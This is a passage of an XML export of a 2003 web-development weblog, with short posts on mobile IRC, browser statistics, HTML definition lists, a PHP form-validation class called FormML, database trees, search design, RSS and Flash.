		<field name="body">&lt;p&gt;Russell Beattie has posted an &lt;a href=&quot;http://www.russellbeattie.com/notebook/20030617.html#002436&quot; title=&quot;Mobile Chatting: Wireless IRC Rules&quot;&gt;enthusiastic description&lt;/a&gt; of a new &lt;acronym title=&quot;Internet Relay Chat&quot;&gt;IRC&lt;/acronym&gt; application for his mobile phone. It looks really neat, but what got me really interested was his &lt;a href=&quot;http://www.russellbeattie.com/notebook/20030617.html#202823&quot; title=&quot;My New Laptop... Maybe&quot;&gt;post today&lt;/a&gt; about his new laptop:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.russellbeattie.com/notebook/20030617.html#202823&quot;&gt;&lt;p&gt;
I got a new machine today... It was pretty fun how I did it. I stayed on the #mobitopia IRC channel via my telephone while I was wandering around the stores - I would type in the make/model/specs and the price and ask the guys online to see what they could find in terms of comparitive prices and to get their opinions.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Russell has been documenting the new mobile phone revolution on &lt;a href=&quot;http://www.russellbeattie.com/notebook/&quot; title=&quot;Russell Beattie Notebook&quot;&gt;his blog&lt;/a&gt; for several months now, and it's well worth reading regularly if you are at all interested in mobile technology.&lt;/p&gt;</field>
		<field name="created">2003-06-17 20:00:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1022</field>
		<field name="title">Eldred Act Reasoning</field>
		<field name="slug">eldred</field>
		<field name="body">&lt;p&gt;Lawrence Lessig &lt;a href=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/2003_06.shtml#001291&quot; title=&quot;firstmonday on eldred&quot;&gt;explains&lt;/a&gt; why the proposed &lt;a href=&quot;http://eldred.cc/&quot;&gt;Eldred Act&lt;/a&gt; does not go further in its aims to reclaim the public domain.&lt;/p&gt;</field>
		<field name="created">2003-06-17 20:04:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1023</field>
		<field name="title">Gecko beats IE!</field>
		<field name="slug">tabularData</field>
		<field name="body">&lt;p&gt;I haven't looked at the statistics for this site in a few months. It turns out I was in for a pleasant surprise:&lt;/p&gt;

&lt;table id=&quot;browserPercentages&quot;&gt;
&lt;caption&gt;Top 10 browsers visiting this site&lt;/caption&gt;
&lt;tr&gt;
 &lt;th&gt;Browser&lt;/th&gt;&lt;th&gt;Percentage&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;Netscape 5.x&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;44.02%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;MSIE 6.0&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;27.29%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;Feedreader&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;6.76%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;NetNewsWire/1.0.3&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;3.74%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;Internet Explorer 5.5x&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;3.69%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;Internet Explorer 5.x&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;3.63%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;SharpReader/0.9.0.2&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;3.34%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;NewsGator/1.2&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;2.60%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;SharpReader/0.9.0.3&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;2.56%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;NetNewsWire/1.0.2&lt;/td&gt;&lt;td class=&quot;numeric&quot;&gt;2.37%&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;Yup, Gecko engine based browsers appear to be more common than Internet Explorer, at least for this small corner of the web.&lt;/p&gt;</field>
		<field name="created">2003-06-17 20:48:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1024</field>
		<field name="title">HTML Definition Lists</field>
		<field name="slug">definitionLists</field>
		<field name="body">&lt;p&gt;Ben Meadowcroft has a &lt;a href=&quot;http://www.benmeadowcroft.com/webdev/articles/definition-lists.shtml&quot; title=&quot;Definition Lists. &amp;lt;DL&amp;gt;, &amp;lt;DT&amp;gt; and &amp;lt;DD&amp;gt;&quot;&gt;new tutorial up&lt;/a&gt; showing how definition lists can be used in semantic markup for lists of definitions, such as glossaries.&lt;/p&gt;

&lt;p&gt;Definition Lists are the third type of list present in &lt;acronym title=&quot;HyperText Markup language&quot;&gt;HTML&lt;/acronym&gt;, after the far more common ordered and unordered list types. They're an interesting if slightly odd concept: although their obvious use is to provide a list of definitions, the &lt;acronym title=&quot;HyperText Markup language&quot;&gt;HTML&lt;/acronym&gt; specification seems to indicate that they can also be used to indicate a logical connection between two items of text; one a label for the other. This slight confusion is caused by the &lt;a href=&quot;http://www.w3.org/TR/html4/struct/lists.html#h-10.1&quot; title=&quot;10.1 Introduction to lists&quot;&gt;examples provided in the specification&lt;/a&gt;, which use a definition list both for separating the different sections of a recipe and for extending a set of key marketing features for an imaginary product.&lt;/p&gt;

&lt;p&gt;Incidentally, although the default style for a definition list is to have the definitions indented to the right of the terms, this can be easily modified by setting the margin and padding for the elements explicitly using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2003-06-17 22:40:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1025</field>
		<field name="title">Easier form validation with PHP</field>
		<field name="slug">theHolyGrail</field>
		<field name="body">&lt;p&gt;Let's talk about form validation. Here's what I would class as the ideal validation system for a form in a web application:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;The form is displayed; you fill it in.&lt;/li&gt;
 &lt;li&gt;You submit the form to the server.&lt;/li&gt;
 &lt;li&gt;If you missed something out or provided invalid input, the form is redisplayed &lt;em&gt;pre-filled with the valid data you already entered&lt;/em&gt;.&lt;/li&gt;
 &lt;li&gt;The redisplayed form tells you what you got wrong. It also flags the fields that were incorrect.&lt;/li&gt;
 &lt;li&gt;Loop until you fill the form in correctly.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Writing this once in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is trivial, but takes quite a bit of &lt;em&gt;very dull&lt;/em&gt; code. Writing this for more than one form quickly becomes a tedious nightmare of duplicating and slightly editing code, which is why so few forms bother.&lt;/p&gt;

&lt;p&gt;I've been trying to figure out an elegant way of automating as much of this code as possible on and off for more than two years. I've tried systems that generate the whole form based on a bunch of criteria (too inflexible), systems that describe the validation rules (fine but they don't help with the redisplay logic) and I've looked at solutions available in other language (such as ASP.NET), all to no avail. Over the past couple of days I've been working on the problem again, and for the first time I think I'm actually getting somewhere.&lt;/p&gt;

&lt;p&gt;My latest attempt (sparked by &lt;a href=&quot;http://www.evolt.org/article/Clever_forms_with_PHP/17/60143/index.html&quot; title=&quot;Clever forms with PHP&quot;&gt;this article&lt;/a&gt; on Evolt) involves embedding validation and redisplay rules in the markup of the form itself. The form is written in &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;, but with a number of additional tags and elements. Any form field elements can have a number of additional attributes which specify the validation rules of the form. For example:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;formML&quot;&gt;
&amp;lt;input type=&quot;text&quot; name=&quot;name&quot; 
&lt;span style=&quot;background-color: yellow&quot;&gt;  compulsory=&quot;yes&quot; validate=&quot;alpha&quot; callback=&quot;uniqueName&quot; &lt;/span&gt;
  size=&quot;20&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The yellow highlighting in the above line marks the additional elements. In this case, they mean that the field is compulsory, must contain only letters, and should be checked for final validity by calling the user defined &lt;code class=&quot;php&quot;&gt;uniqueName()&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;There are a few other validation attributes, but the above gives a good idea of how the system works. The second problem is how to display errors. Part of the solution here is my custom &lt;code class=&quot;formML&quot;&gt;&amp;lt;error&amp;gt;&lt;/code&gt; element, which can be used to associate an error message with an error in a particular field. In my tests I've been using this to display an exclamation mark next to invalid fields:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;formML&quot;&gt;
&amp;lt;input type=&quot;text&quot; name=&quot;name&quot; 
  compulsory=&quot;yes&quot; validate=&quot;alpha&quot; callback=&quot;uniqueName&quot; 
  size=&quot;20&quot; /&amp;gt;
&lt;span style=&quot;background-color: yellow&quot;&gt;&amp;lt;error for=&quot;name&quot;&amp;gt; !&amp;lt;/error&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This associates the text inside the &lt;code class=&quot;formML&quot;&gt;&amp;lt;error&amp;gt;&lt;/code&gt; element (in this case the single exclamation mark) with the &quot;name&quot; field.&lt;/p&gt;

&lt;p&gt;So far, all I've done is add a bunch of invalid markup to an otherwise valid chunk of &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;. The key is how this markup is processed. FormML (for want of a better name) is never passed to the browser; instead it is processed by my &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; &lt;code class=&quot;php&quot;&gt;FormProcessor&lt;/code&gt; class before being displayed. This class strips out all of the FormML tags, and also applies logic to the rest of the form based on the information from the tags. Because the whole thing is &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;, this can be relatively easily achieved using &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s built in &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parser. The &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; is modified on the fly to create the &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; that is sent to the browser. In the above example, the contents of the &lt;code class=&quot;formML&quot;&gt;&amp;lt;error&amp;gt;&lt;/code&gt; element would only be displayed if the form was being redisplayed and the user had not filled in their name correctly. In addition, the class populates the value attribute of each input element with the previously entered data and adds an &quot;invalid&quot; class to the element to allow it to be styled appropriately.&lt;/p&gt;

&lt;p&gt;The next problem is to display a list of descriptive error messages describing the problem. This took slightly longer to work out: I needed a way of setting an error message for each potential problem (remember there are several ways a field can be invalid: it could have been left unfilled, or it could have failed a regular expression check, or it could have failed a callback function), and I also needed some way of indicating how these errors should be displayed. My eventual solution was to introduce a new &lt;code class=&quot;formML&quot;&gt;&amp;lt;errormsg&amp;gt;&lt;/code&gt; element for specifying error messages, and a simple templating system (based on a few more custom tags) for indicating where these errors should be displayed. I'm not entirely happy with the way this works at the moment, but here's what I'm using:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;formML&quot;&gt;
&amp;lt;errorlist&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;erroritem&amp;gt; &amp;lt;li&amp;gt;&amp;lt;message /&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;/erroritem&amp;gt;
&amp;lt;/ul&amp;gt;
&amp;lt;/errorlist&amp;gt;
&amp;lt;errormsg field=&quot;name&quot; test=&quot;compulsory&quot;&amp;gt;You did not enter your name&amp;lt;/errormsg&amp;gt;
&amp;lt;errormsg field=&quot;name&quot; test=&quot;alpha&quot;&amp;gt;Your name must consist &amp;lt;em&amp;gt;only&amp;lt;/em&amp;gt; of letters&amp;lt;/errormsg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code class=&quot;formML&quot;&gt;&amp;lt;errormsg&amp;gt;&lt;/code&gt; elements can be placed anywhere in the markup, and will be removed before display. The &lt;code class=&quot;formML&quot;&gt;&amp;lt;errorlist&amp;gt;&lt;/code&gt; fragment defines the template for the list of error messages, with the &lt;code class=&quot;formML&quot;&gt;&amp;lt;erroritem&amp;gt;&lt;/code&gt; element enclosing the &quot;template&quot; for each error and the &lt;code class=&quot;formML&quot;&gt;&amp;lt;message&amp;gt;&lt;/code&gt; element showing where the actual error message (as defined elsewhere) should be displayed. Note that the &lt;code class=&quot;formML&quot;&gt;&amp;lt;errormsg&amp;gt;&lt;/code&gt; elements specify the field &lt;em&gt;and&lt;/em&gt; the test that they relate to. It is not necessary to provide custom error messages for every possible field/test combination; the system generates moderately intelligent error messages in the event that one has not been provided.&lt;/p&gt;

&lt;p&gt;That's a lot of custom markup to define the behaviour of a form. The good news is that the actual &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; used to display, validate and redisplay the form is incredibly simple. Here it is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;
$formML = '... formML XML code goes here ...';
$processor = new FormProcessor($formML);
if ($processor-&amp;gt;validate()) {
    // The form has been submitted and is valid - process the data
    echo 'Form data is OK!';
} else {
    // This will display the form for the first time OR redisplay it
    // with relevant error messages
    $processor-&amp;gt;display();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And that's all there is to it.&lt;/p&gt;

&lt;p&gt;The code is still under very heavy development. At the moment it's messy, has several minor bugs (and possibly some major ones I haven't yet uncovered), isn't fully tested and is almost certainly not ready for deployment. Never-the-less, you can play with &lt;a href=&quot;/code/php/formprocessor/test.php&quot; title=&quot;FormProcessor Demo&quot;&gt;a demo form&lt;/a&gt; that uses it or grab the code here:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;/code/php/formprocessor/FormProcessor.class.php.txt&quot;&gt;FormProcesser.class.php&lt;/a&gt; - the class(es)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;/code/php/formprocessor/test.php.txt&quot;&gt;test.php&lt;/a&gt; - the demo form, as seen &lt;a href=&quot;/code/php/formprocessor/test.php&quot; title=&quot;FormProcessor Demo&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Incidentally, I haven't mentioned javascript in the above in an attempt to keep things simple. I know client side validation is a great addition to stuff like this (provided it's backed up by solid server side logic) and one of my longer term aims is to dynamically add the necessary javascript to the form during the processing phase, thus skipping the need to write any boring validation code by hand.&lt;/p&gt;</field>
		<field name="created">2003-06-17 23:47:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1026</field>
		<field name="title">Gorgeous CSS Rollovers</field>
		<field name="slug">gorgeousLinks</field>
		<field name="body">&lt;p&gt;I've been planning a follow-up to my &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/27/funWithLinks&quot;&gt;basic link styling tutorial&lt;/a&gt; for over a week now, but it's going to be a lot shorter now thanks to Al Sparber's excellent &lt;a href=&quot;http://www.projectseven.com/tutorials/css_menus/list_01/&quot;&gt;Uberlink CSS Rollover tutorial&lt;/a&gt;, which covers a lot of useful concepts and ends up with a truly gorgeous looking result. Thoroughly recommended.&lt;/p&gt;</field>
		<field name="created">2003-06-17 23:57:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1027</field>
		<field name="title">The Matrix Reloaded, Abridged</field>
		<field name="slug">reloadedAbridged</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://ter.air0day.com/index.php?script=matrixreloaded&quot;&gt;The Matrix Reloaded: The Abridged Script&lt;/a&gt;, by Rod Hilton (via &lt;a href=&quot;http://www.choam.org/tbp/weblog/archives/000018.html&quot; title=&quot;The Editing Room - Abridged Scripts&quot;&gt;teeb!&lt;/a&gt;). Do NOT read this if you haven't seen the film yet; you won't get the jokes and it's full of spoilers. It's the best/funniest analysis of Reloaded I've seen yet.&lt;/p&gt;</field>
		<field name="created">2003-06-18 00:24:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1028</field>
		<field name="title">Thunderbird supports extensions</field>
		<field name="slug">thunderbirdExtensions</field>
		<field name="body">&lt;p&gt;I've been pretty unexcited by Thunderbird so far: I'm pretty picky about my mail clients (so far Evolution is the only client I've really liked) and Mozilla's never really lived up to my expectiations. I'm preparing to change my mind now that &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/this_is_a_call_for_thunderbird_extensions.html&quot; title=&quot;Blogzilla: This is a Call for Thunderbird Extensions&quot;&gt;Thunderbird supports extensions&lt;/a&gt;. Firebird's &lt;a href=&quot;http://texturizer.net/firebird/extensions.html&quot; title=&quot;Mozilla Firebird Help: Extensions&quot;&gt;extensive collection&lt;/a&gt; of extensions is one of its strongest advantages, and the idea of a mail client that can be customised in a whole bunch of different ways by adding new extensions is pretty inspiring. I might even have to try and learn to write some myself.&lt;/p&gt;</field>
		<field name="created">2003-06-18 23:13:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1029</field>
		<field name="title">Storing trees in a database</field>
		<field name="slug">storingTrees</field>
		<field name="body">&lt;p&gt;SitePoint: &lt;a href=&quot;http://www.sitepoint.com/article/1105&quot;&gt;Storing Hierarchical Data in a Database&lt;/a&gt;, by Gijs Van Tulder. The article first shows how the easy way of storing hierarchies in a database, using parent fields and a recursive &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; function to iterate up the tree. It then goes on to talk about a far more interesting alternative called &quot;Modified Preorder Tree Traversal&quot; where trees are first &quot;flattened&quot; in to a heap-like structure, then each node is stored with a pair of numbers representing that node's position in the tree. I'd seen this somewhere before but Gijs Van Tulder's explanation is far clearer, and comes with some good examples showing how this unconventional storage method can retrieve all of the eventual children of a node in a single query. He also talks about ways of updating the tree structure when new items are added.&lt;/p&gt;</field>
		<field name="created">2003-06-19 22:58:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1030</field>
		<field name="title">Quick testing of alt attributes</field>
		<field name="slug">testingAltAttributes</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000916.php&quot; title=&quot;Bookmarklet: Get ALT Info&quot;&gt;Web Graphics&lt;/a&gt;, ScriptyGoddess' &lt;a href=&quot;http://www.scriptygoddess.com/archives/003975.php&quot; title=&quot;bookmarklets: Display all ALT values of images&quot;&gt;Get ALT Info bookmarklet&lt;/a&gt;, which displays a list of all of the images on a page along with their alt attributes; great for testing a page to make sure you haven't missed any.&lt;/p&gt;</field>
		<field name="created">2003-06-19 23:00:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1031</field>
		<field name="title">More on Search</field>
		<field name="slug">moreSearch</field>
		<field name="body">&lt;p&gt;Tim Bray's series on full-text search has got to &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/06/18/HowSearchWorks&quot; title=&quot;On Search: Basic Basics&quot;&gt;the meaty bit&lt;/a&gt;: how search engines actually work, including an overview of the kind of data structures they use (presented in &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; format for readability). The basics are a lot simpler than you might think. Tim has also posted some thoughts on &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/06/17/SearchUsers&quot; title=&quot;On Search: The Users&quot;&gt;how people actually use search&lt;/a&gt;, of which the most interesting point is that advanced search is hardly ever touched.&lt;/p&gt;

&lt;p&gt;Meanwhile, Julie Albertson has a four part series that concentrates on the design of the interface for a search tool (aimed principally at online news sites):&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.juliealbertson.com/search.html&quot;&gt;The basics of search design&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.juliealbertson.com/search2.html&quot;&gt;Placement&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.juliealbertson.com/search3.html&quot;&gt;Quick-search interface&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.juliealbertson.com/search4.html&quot;&gt;Advanced search interface&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;My personal favourite approach to search design is the one advocated by Steve Krug in his excellent book on web usability &quot;Don't Make Me Think!&quot;: Have a text field and a button. If the overall thing is labelled &quot;Search&quot; then the button should say &quot;Go&quot;, otherwise the button should say &quot;Search&quot;. Any additional wording will just slow people down. I use the label &quot;Search Site&quot; on this site partly to make it even clearer what will be searched but mainly because the slightly longer label provides more visual balance within the context of my navigation bar.&lt;/p&gt;</field>
		<field name="created">2003-06-19 23:25:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1032</field>
		<field name="title">Problems with RSS</field>
		<field name="slug">problems</field>
		<field name="body">&lt;p&gt;Tim Bray &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/06/19/RSS4All&quot; title=&quot;RSS: Promise and Peril&quot;&gt;explains RSS&lt;/a&gt; to an imaginary bank manager:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.tbray.org/ongoing/When/200x/2003/06/19/RSS4All&quot;&gt;
&lt;p&gt;Mr Safe: Well, I've learned that sometimes we have to take little
risks on these Internet standards, and they pay off.
RSS is an Internet Standard, right?&lt;/p&gt;
 &lt;p&gt;Tim: Well, er, actually, no standards organization has actually blessed
RSS.
But lots of Internet technology comes up from the grassroots like this, you
know.&lt;/p&gt;
 &lt;p&gt;Mr Safe: Yes, you kids have a phrase, don't you: &quot;Rough consensus
and running code,&quot; wasn't that it?
I have to admire the way you engineers work together to get things done.&lt;/p&gt;

 &lt;p&gt;Tim: Well, actually, there are at least two competing versions of RSS, but
we seem to interoperate OK.&lt;/p&gt;
 &lt;p&gt;Mr Safe: Yes, and I suppose the people behind them are working together
constructively to bring order to the landscape.&lt;/p&gt;
 &lt;p&gt;Tim: Well, actually, the dialogue tends to devolve into 
childish name-calling.  But the stuff does still seem to work really well.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It's pretty much &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; in a nut-shell :)&lt;/p&gt;</field>
		<field name="created">2003-06-20 15:39:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1033</field>
		<field name="title">Jython as a learning tool</field>
		<field name="slug">jythonLearningTool</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://www.joeygibson.com/blog/tech/jython/JythonIsUseful.html&quot;&gt;Jython Is Just Too Useful&lt;/a&gt;, Joey Gibson shows how Jython can be used to quickly demonstrate Java class libraries interactively, including using Python's &lt;code class=&quot;python&quot;&gt;dir()&lt;/code&gt; builtin to inspect available methods of Java classes. I used Jython last year while learning Swing for a piece of University coursework and found that being able to interactively create and manipulate Swing components (and see them appear on the screen as I typed) sped up the learning process a great deal.&lt;/p&gt;</field>
		<field name="created">2003-06-20 15:48:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1034</field>
		<field name="title">Gorilla Web Tips</field>
		<field name="slug">gorillaWebTips</field>
		<field name="body">&lt;p&gt;D. Keith Robinson's Gorilla Web Tips: &lt;a href=&quot;http://www.7nights.com/dkrprod/gwt_one.php&quot;&gt;News and Featured Content&lt;/a&gt;, the first in a series of columns.&lt;/p&gt;</field>
		<field name="created">2003-06-20 22:34:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1035</field>
		<field name="title">Some thoughts on caching</field>
		<field name="slug">caching</field>
		<field name="body">&lt;p&gt;Keith is &lt;a href=&quot;http://www.keithdevens.com/weblog/archive/2003/Jun/20/CachingTemplatesMVC&quot; title=&quot;Caching, Templates, and MVC&quot;&gt;thinking about caching&lt;/a&gt;. He's drawn up a pretty interesting set of thoughts and requirements, such as support for conditional GET and fine-grained cache length control, and support for caching most of a page while leaving some small parts dynamic.&lt;/p&gt;

&lt;p&gt;Personally, I'm considering moving away from dynamically generated content for the most part on this site and going with a page generation scheme something like Moveable Type (or giving &lt;a href=&quot;http://simon.incutio.com/archive/2002/11/16/funkyCachingExplained&quot; title=&quot;Funky caching explained&quot;&gt;funky caching&lt;/a&gt; a go). My justification for generating everything dynamically when I built the software originally was that I'd never get a huge amount of traffic so PHP and MySQL would be more than capable of keeping up with demand. While that's still true, traffic to this site has risen to the point where it's a little less certain that everything will hold together (I get failed database connection emails a few times a day). I'm already caching the front page once a minute and caching some internal things such as related entries, so moving to a full caching system for the next generation of the system seems like a logical progression. Besides, there's not much point in dynamically generating hits to archived entries from last year.&lt;/p&gt;</field>
		<field name="created">2003-06-21 09:27:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1036</field>
		<field name="title">PEAR Tutorials</field>
		<field name="slug">pearTutorials</field>
		<field name="body">&lt;p&gt;PHP Kitchen have compiled a list of &lt;a href=&quot;http://www.phpkitchen.com/staticpages/index.php?page=2003041204203962&quot;&gt;PEAR tutorials&lt;/a&gt;, covering a number of useful &lt;acronym title=&quot;PHP Extension and Application Repository&quot;&gt;PEAR&lt;/acronym&gt; modules. This is an especially important resource considering that &lt;acronym title=&quot;PHP Extension and Application Repository&quot;&gt;PEAR&lt;/acronym&gt;'s module documentation is probably the weakest part of the project. Most modules have some documentation available in the &lt;acronym title=&quot;PHP Extension and Application Repository&quot;&gt;PEAR&lt;/acronym&gt; Manual but much of this is incomplete and crucially there are no links from the package directory entries to the documentation for each package. It's a shame because &lt;acronym title=&quot;PHP Extension and Application Repository&quot;&gt;PEAR&lt;/acronym&gt; has a great deal of excellent code that many developers are completely unaware of.&lt;/p&gt;
</field>
		<field name="created">2003-06-23 12:45:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1037</field>
		<field name="title">XML Shorthand Language</field>
		<field name="slug">shorthandXML</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.keithdevens.com/weblog/archive/2003/Jun/22/PXSL&quot; title=&quot;PXSL&quot;&gt;Keith&lt;/a&gt;, &lt;a href=&quot;http://community.moertel.com/pxsl/&quot;&gt;PXSL, the Parsimonious XML Shorthand Language&lt;/a&gt; provides a shorthand way of writing and maintaining &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; documents. It's based around the idea that a lot of &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; formats contain more markup than actual text, thus by reversing the way the syntax is formatted and using meaningful indentation to express hierarchies markup heavy &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; can be greatly simplified.&lt;/p&gt;</field>
		<field name="created">2003-06-23 12:56:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1038</field>
		<field name="title">Sporting Gentleman's Guide</field>
		<field name="slug">sportingGentleman</field>
		<field name="body">&lt;p&gt;If you're still wondering what &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; is actually &lt;em&gt;for&lt;/em&gt;, Ben Hammersley's &lt;a href=&quot;http://www.benhammersley.com/reboot/&quot;&gt;Sporting Gentleman's Guide
to the Semantic Web&lt;/a&gt; includes a perfect example of triples (even if it get's a bit less obvious after that).&lt;/p&gt;</field>
		<field name="created">2003-06-23 18:08:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1039</field>
		<field name="title">Another rant about Flash</field>
		<field name="slug">anotherFlashRant</field>
		<field name="body">&lt;p&gt;Michael Pick has kicked off an &lt;a href=&quot;http://www.mikepick.com/news/archives/000097.html&quot; title=&quot;Flash Forward&quot;&gt;interesting discussion&lt;/a&gt; on the usefulness of Flash, which is &lt;a href=&quot;http://www.mezzoblue.com/cgi-bin/mt/mezzo/archives/000157.asp&quot; title=&quot;Reconciling Flash&quot;&gt;continued on mezzoblue&lt;/a&gt;. The key idea under discussion is that while Flash has its uses it remains a fundamentally bad choice for serving up text based content. I &lt;a href=&quot;http://simon.incutio.com/archive/2002/07/17/leaveMyTextAlone&quot; title=&quot;Flash: Leave my text alone!&quot;&gt;couldn't agree more&lt;/a&gt;. It's nice to see that some Flash designers think the same way.&lt;/p&gt;

&lt;p&gt;That said, a discussion with friends at Uni a while back made me reconsider my position on Flash to a certain extent. I was arguing that full Flash-based sites practically always make textual content slower and/or harder to access, and (with the notable exceptions of online cartoons and interactive graphical information) are thus a bad choice for practically any site containing textual information. I was then confronted with something I hadn't really considered: some people use the internet to look at pretty things and be entertained rather than just to find information. Over the past few years I have become reliant on the internet as a tool for finding information, so the idea of information being &quot;hidden&quot; behind a layer of eye candy lost its appeal a long time ago. I had never really considered that there are many people who log on to the 'net for half an hour every few evenings with the soul aim of entertainment rather than information retrieval.&lt;/p&gt;

&lt;p&gt;With that in mind, maybe the X2 Movie site wasn't quite as bad as &lt;a href=&quot;http://simon.incutio.com/archive/2003/06/12/filmSitesThatSuck&quot; title=&quot;Official film sites almost always suck&quot;&gt;I thought it was&lt;/a&gt;. It was just aimed at a completely different audience.&lt;/p&gt;

&lt;p&gt;This does nothing to change my overall opinion of Flash as a tool for serving textual content. I'll believe Flash is a good choice for textual content when I can access that content using &lt;a href=&quot;http://lynx.browser.org/&quot;&gt;Lynx&lt;/a&gt;.&lt;/p&gt;

